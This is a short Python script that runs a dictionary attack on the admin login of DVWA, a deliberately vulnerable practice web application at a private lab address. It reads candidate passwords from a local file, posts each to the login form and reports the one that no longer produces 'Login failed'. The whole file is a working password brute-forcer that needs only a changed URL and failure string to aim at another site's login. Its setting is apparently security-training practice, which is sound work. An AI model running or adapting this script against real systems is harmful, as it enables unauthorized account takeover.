#!/usr/bin/python

import requests


target_url = "http://10.0.2.15/dvwa/login.php"
formData = {"username" : "admin", "password":"", "Login":"submit"}

with open("./passwords.txt", "r") as pwd_file:
    for line in pwd_file:
        word = line.strip()
        formData["password"] = word
        response = requests.post(target_url, data=formData)
        if "Login failed" not in response.content.decode():
            print("[+] password is " + word)
            exit()

print("password was not found")
